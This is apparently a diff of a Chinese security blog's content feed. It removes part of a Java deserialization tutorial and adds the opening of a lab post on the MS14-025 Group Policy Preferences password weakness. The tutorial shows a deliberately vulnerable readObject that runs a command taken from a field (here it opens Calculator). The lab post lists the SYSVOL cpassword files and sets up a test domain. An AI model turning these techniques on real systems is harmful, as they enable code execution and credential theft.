-<h2 id="0x03-序列化实现的方式"><a href="#0x03-序列化实现的方式" class="headerlink" title="0x03 序列化实现的方式"></a>0x03 序列化实现的方式</h2><h3 id="3-1-Serializable"><a href="#3-1-Serializable" class="headerlink" title="3.1 Serializable"></a>3.1 Serializable</h3><p>将要序列化的类实现 <code>Serializabel</code> 接口（Serializable接口是一个标记接口，不用实现任何方法。一旦实现了此接口，则表明该类的对象就是可序列化的），而且所有属性必须是可序列化的，就是如果一个可序列化的类的成员不是基本类型，也不是String类型，比如自己自定义的类，那这个引用类型也必须是可序列化的，否则，会导致此类不能序列化(用<code>transient</code>关键字修饰的属性除外，不参与序列化过程) 。</p>
-<p><strong>需要序列化的类</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 21:46</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>序列化</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 22:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化和反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserSerializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化， 将对象转化为字节序列</span></span><br><span class="line">        serialize(user);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(User user)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FileOutputStream fout = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;user.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fout);</span><br><span class="line">        out.writeObject(user);</span><br><span class="line">        out.close();</span><br><span class="line">        fout.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到运行后，生产了一个文件，将<code>user</code> 对象变成了可持久化存储的二进制数据。</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210405211458.png" alt="image-20210404222530833"></p>
-<p>可以来看一下该对象序列化后的二进制数据</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210405211505.png" alt="image-20210404223840477"></p>
-<p>序列化的数据流以魔术数字和版本号开头，这个值是在调用<code>ObjectOutputStream</code>序列化时，由<code>writeStreamHeader</code>方法写入。开头的几位一般来当作Java序列化字节的特征。</p>
-<p><strong>反序列化</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 22:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化和反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserSerializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化， 将对象转化为字节序列</span></span><br><span class="line"><span class="comment">//        serialize(user);</span></span><br><span class="line">        <span class="comment">// 反序列化，将字节序列恢复为对象</span></span><br><span class="line">        User user1 = unserialize();</span><br><span class="line">        System.out.println(user1.getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> User <span class="title">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FileInputStream fileIn = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;user.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(fileIn);</span><br><span class="line">        User user = (User) in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        fileIn.close();</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210405211519.png" alt="image-20210404224748419"></p>
-<p>读取了序列化文件，将二进制文件重新恢复为<code>user</code>对象，对象里面的属性也是完美恢复。</p>
-<h3 id="3-2-Externalizable"><a href="#3-2-Externalizable" class="headerlink" title="3.2 Externalizable"></a>3.2 Externalizable</h3><p>通过实现<code>Externalizable</code>接口进行序列化和反序列胡，但必须实现<code>writeExternal</code>、<code>readExternal</code>方法，并且还要实现一个类的<strong>无参构造方法</strong>，<code>Serializable</code> 接口可以不用实现。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/5 00:24</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> <span class="keyword">implements</span> <span class="title">Externalizable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现了Externalizable这个接口需要提供无参构造，在反序列化时会检测</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.getClass() + <span class="string">&quot;的EvilClass()无参构造方法被调用!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>用法和实现了<code>Serializable</code>接口一样，这里就不演示了。</p>
-<h2 id="0x04-readObject-方法"><a href="#0x04-readObject-方法" class="headerlink" title="0x04 readObject()方法"></a>0x04 readObject()方法</h2><p>特地提到这个方法是因为在反序列化漏洞中它起到了关键作用。因为在序列化过程中，JVM虚拟机会试图调用对象类里的 <code>writeObject</code> 和 <code>readObject</code> 方法，进行用户自定义的序列化和反序列化，如果没有这样的方法，则默认调用是 <code>ObjectOutputStream</code> 的 <code>defaultWriteObject</code> 方法以及 <code>ObjectInputStream</code> 的 <code>defaultReadObject</code> 方法。用户自定义的 <code>writeObject</code> 和 <code>readObject</code> 方法可以允许用户控制序列化的过程，比如可以在序列化的过程中动态改变序列化的数值。 </p>
-<blockquote>
-<p>  Java反序列化的过程中可以自动执行序列化类的四个方法，实现了<code>Serializable</code>接口可以执行的方法包括<code>readObject</code>、<code>readObjectNoData</code>、<code>readResolve</code>，以及实现了<code>Externalizable</code>接口的<code>readExternal</code>方法。这些在找反序列化漏洞时都需要重点关注。</p>
-</blockquote>
-<p>如果<code>readObject</code>方法书写不当的话就有可能引发恶意代码的执行，例如</p>
-<p><strong>基本类</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 23:34</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.getClass() + <span class="string">&quot;的EvilClass()无参构造方法被调用!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilClass</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.getClass() + <span class="string">&quot;的EvilClass(String name)构造方法被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.getClass() + <span class="string">&quot;的getName被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.getClass() + <span class="string">&quot;的setName被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.getClass() + <span class="string">&quot;的toString()被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;EvilClass&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + getName() + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.getClass() + <span class="string">&quot;的readObject()被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="comment">// windows</span></span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;, name&#125;);</span></span><br><span class="line">        <span class="comment">// mac</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;-a&quot;</span>, name&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>readObject</code>中存在执行命令的代码<code>Runtime.getRuntime().exec(new String[]&#123;&quot;open&quot;, &quot;-a&quot;, name&#125;)</code>，name参数是要执行的命令。那么我们可以构造一个恶意的对象，将其name属性赋值为要执行的命令，当反序列化触发<code>readObject</code>时就会RCE。如下</p>
-<p><strong>序列化和反序列化</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 23:36</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilSerialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        EvilClass evilObj = <span class="keyword">new</span> EvilClass();</span><br><span class="line"><span class="comment">//        evilObj.setName(&quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">// mac</span></span><br><span class="line">        evilObj.setName(<span class="string">&quot;Calculator&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化为字节数组</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = serializeToBytes(evilObj);</span><br><span class="line">	<span class="comment">// 反序列化</span></span><br><span class="line">        EvilClass o = (EvilClass)deserializeFromBytes(bytes);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serializeToBytes(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">final</span> ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        objOut.flush();</span><br><span class="line">        objOut.close();</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">deserializeFromBytes</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> ByteArrayInputStream in = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        <span class="keyword">final</span> ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210405211527.png" alt="image-20210405000541157"></p>
-<p>这是一个极端的例子，在真实场景中，不会有人真的这样直接写一句执行命令的代码在readObject()中，这样写的开发绝对会被拉出去祭天的。所以反序列化漏洞通常会需要Java的一些特性进行配合比如<code>反射(invoke)</code>。然后就是利用链的寻找。反序列化漏洞需要三个东西</p>
-<ol>
-<li> 反序列化入口(source)</li>
-<li> 目标方法(sink)</li>
-<li> 利用链(gadget chain)</li>
-</ol>
-<p>大佬们基本都会去寻找重写了这个<code>readObject</code>方法的类，并配合Java的<code>invoke</code>反射机制，构造利用链，形成了Java中最具特色的反序列化攻击。而且再看上图中的输出结果，不仅仅触发了<code>readObject</code>方法，还触发了<code>toString()</code>、<code>无参构造</code>、<code>set</code>、<code>get</code>方法，那么在实际寻找利用链的过程中就不仅仅需要关注<code>readObject()</code>的方法了。</p>
-<p>代码地址：<a href="https://github.com/yhy0/JavaSerializeDemo">https://github.com/yhy0/JavaSerializeDemo</a></p>
-<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p>Java反序列之从萌新到菜鸟 <a href="https://www.kingkk.com/2019/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BB%8E%E8%90%8C%E6%96%B0%E5%88%B0%E8%8F%9C%E9%B8%9F/">https://www.kingkk.com/2019/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BB%8E%E8%90%8C%E6%96%B0%E5%88%B0%E8%8F%9C%E9%B8%9F/</a> </p>
-<p>Java反序列化技术分享 <a href="https://github.com/Y4er/WebLogic-Shiro-shell">https://github.com/Y4er/WebLogic-Shiro-shell</a> </p>
-]]></content>
-      <categories>
-        <category>漏洞原理</category>
-      </categories>
-      <tags>
-        <tag>漏洞原理</tag>
       </tags>
   </entry>
   <entry>
@@ -1640,6 +1514,132 @@
       <tags>
         <tag>内网渗透</tag>
         <tag>docker逃逸</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>组策略提权实验</title>
+    <url>/2021/01/16/%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C/</url>
+    <content><![CDATA[<blockquote>
+<p>管理员在域中新建一个组策略后,操作系统会自动在SYSVO共享目录中生成一个XML文件，即<code>Groups.xml</code>,该文件中保存了该组策略更新后的密码。</p>
+</blockquote>
+<h2 id="1-组策略基本介绍"><a href="#1-组策略基本介绍" class="headerlink" title="1. 组策略基本介绍"></a>1. 组策略基本介绍</h2><p>组策略可以控制用户帐户和计算机帐户的工作环境。它提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。有本机组策略和域的组策略。本机组策略用于计算机管理员统一管理本机以及所有用户，域内的组策略用于域管统一管理域内的所有计算机以及域用户。 在本文中侧重点讲的是域内的组策略，借机学一下域环境搭建</p>
+<h2 id="2-SYSVOL-漏洞-MS14-025"><a href="#2-SYSVOL-漏洞-MS14-025" class="headerlink" title="2. SYSVOL 漏洞(MS14-025)"></a>2. SYSVOL 漏洞(MS14-025)</h2><p>SYSVOL是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制。SYSVOL 文件夹是在安装活动目录时自动创建的，主要用来存放登录脚本、组策略数据及其他域控制器需要的域信息等。SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。整个SYSvOL 目录在所有的域控制器中是自动同步和共享的，所有的域策略均存放在C:\Windows\SYSVOL\DOMAIN\Policies 目录中。</p>
+<p>在一般的域环境中,所有机器都是脚本化批量部署的,数据量通常很大。为了方便地对所有的机器进行操作,网络管理员往往会使用域策略进行统一的配置和管理。大多数组织在创建域环境后，会要求加人域的计算机使用域用户密码进行登录验证。为了保证本地管理员密码的安全性，这些组织的网络管理员往往会修改本地管理员密码。但是当通过组策略统一修改密码，虽然密码强度会有所提高，这就造成了所有机器的本地管理员密码是相同的。攻击者获得了一台机器的本地管理员密码,就相当于获得了整个域中所有机器的本地管理员密码。</p>
+<p>在域中，存在一个默认的共享路径：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</span><br></pre></td></tr></table></figure>
+
+<p>所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等。</p>
+<p>例如，测试主机所在域为test.yhy，可访问共享文件夹<code>\\test.yhy\SYSVOL\test.yhy</code>，如下图：</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084350.png" alt="image-20210116111851931"></p>
+<p>在早期的版本，某些组策略首选项可以存储加密过的密码，加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了私钥，地址： <a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx%E3%80%82">https://msdn.microsoft.com/en-us/library/cc422924.aspx。</a></p>
+<p>![image-20210116111342068](/Users/yhy/Library/Application Support/typora-user-images/image-20210116111342068.png)</p>
+<p>如下几个组策略首选项文件中会存在可选的密码cpassword 属性:</p>
+<ul>
+<li><p>  Groups\Groupsx.xml</p>
+</li>
+<li><p>  Services\Services.xml</p>
+</li>
+<li><p>  ScheduledTasks\ScheduledTasks.xml</p>
+</li>
+<li><p>  Printers\Printers.xml</p>
+</li>
+<li><p>  Drives\Drives.xml</p>
+</li>
+<li><p>  DataSources\DataSources.xml</p>
+</li>
+</ul>
+<h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h2><h3 id="3-1-域环境搭建"><a href="#3-1-域环境搭建" class="headerlink" title="3.1 域环境搭建"></a>3.1 域环境搭建</h3><h4 id="3-1-1-环境要求"><a href="#3-1-1-环境要求" class="headerlink" title="3.1.1 环境要求"></a>3.1.1 环境要求</h4><p>环境：Windows Server 2008R2 </p>
+<p>网络：NAT模式</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084407.png" alt="image-20210116112955314"></p>
+<p>更改管理员Administrator 密码为强密码，例如：test.yhy@123</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084412.png" alt="image-20210116114025566"></p>
+<h4 id="3-1-2-添加域"><a href="#3-1-2-添加域" class="headerlink" title="3.1.2 添加域"></a>3.1.2 添加域</h4><p>点击左下角开始按钮旁边的服务器管理器，角色 —&gt; 添加角色</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084418.png" alt="image-20210116112445745"></p>
+<p>选中 Active Directory 域服务</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084422.png" alt="image-20210116113323735"></p>
+<p>一直下一步，安装即可</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084429.png" alt="image-20210116113443897"></p>
+<p>关闭后，打开“服务器管理器”，找到Active Directory安装向导</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084433.png" alt="image-20210116113523528"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084437.png" alt="image-20210116113639168"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084446.png" alt="image-20210116114315069"></p>
+<p>因为前面没配置静态IP（前面应该配置为静态IP的，不过这个环境无所谓了），这里选择是：</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084451.png" alt="image-20210116114528206"> </p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084518.png" alt="image-20210116114630800"></p>
+<p>点击是，下一步，设置密码：test.yhy@123</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084525.png" alt="image-20210116114714649"></p>
+<p>一直下一步，等待安装</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084531.png" alt="image-20210116114816453"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084537.png" alt="image-20210116114855068"></p>
+<p>完成，重启。</p>
+<p>测试一下：<code>net user /domain</code>, ok</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084547.png" alt="image-20210116115925975"></p>
+<h4 id="3-1-3安装FTP服务"><a href="#3-1-3安装FTP服务" class="headerlink" title="3.1.3安装FTP服务"></a>3.1.3安装FTP服务</h4><p>虚拟机不知道为啥装不上VMware Tools，没办法拖文件，这里打开FTP服务，使用FTP上传文件。</p>
+<p>还是点击左下角开始按钮旁边的服务器管理器，角色 —&gt; 添加角色</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084554.png" alt="image-20210116120244713"></p>
+<p>选择Web服务（IIS），下一步，最下边选择FTP服务器</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084558.png" alt="image-20210116120911584"></p>
+<p>一直下一步，安装</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084604.png" alt="image-20210116120952490"></p>
+<p>完成后，点击开始按钮，所有程序 —&gt; 管理工具 —&gt; Internet 信息服务(IIS)管理器</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084609.png" alt="image-20210116120424350"></p>
+<p>右键添加FTP站点</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084618.png" alt="image-20210116122419671"></p>
+<p>站点名称随意，物理路径，这里选择了C盘下新建文件夹，</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084624.png" alt="image-20210116123005662"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084629.png" alt="image-20210116123140690"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084634.png" alt="image-20210116123215490"></p>
+<p>然后完成即可， 这时候使用FTP连接工具即可，连不上通过控制面板，关闭防火墙即可</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084638.png" alt="image-20210116123531384"></p>
+<h3 id="3-2-创建组策略，批量修改域中机器的本地管理员密码"><a href="#3-2-创建组策略，批量修改域中机器的本地管理员密码" class="headerlink" title="3.2 创建组策略，批量修改域中机器的本地管理员密码"></a>3.2 创建组策略，批量修改域中机器的本地管理员密码</h3><h4 id="3-2-1创建组策略"><a href="#3-2-1创建组策略" class="headerlink" title="3.2.1创建组策略"></a>3.2.1创建组策略</h4><p>Win + R 打开运行 ，输入gpmc.msc ，进入组策略管理。</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084644.png" alt="image-20210116124142601">         右击<code>组策略</code> —&gt; <code>新建</code>:</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084649.png" alt="image-20210116124834370"></p>
+<p>右击<code>test</code>(刚刚创建好的组策略对象)–&gt;<code>编辑</code>,来到如下位置：</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084653.png" alt="image-20210116124949983"></p>
+<p>右击<code>本地用户和组</code>–&gt;<code>新建</code>–&gt;<code>本地用户</code>：</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084658.png" alt="image-20210116125418016"></p>
+<p>其中设置的密码为<code>hackyhy.123</code></p>
+<p>回到组策略管理，设置组策略的对象，添加<code>Domain Computers</code>到组策略组中：</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084712.png" alt="image-20210116125705664"></p>
+<p>查看组策略对象<code>test</code>的详细信息：</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084718.png" alt="image-20210116125821832"></p>
+<p>至此，组策略配置完成，域内主机重新登录。</p>
+<blockquote>
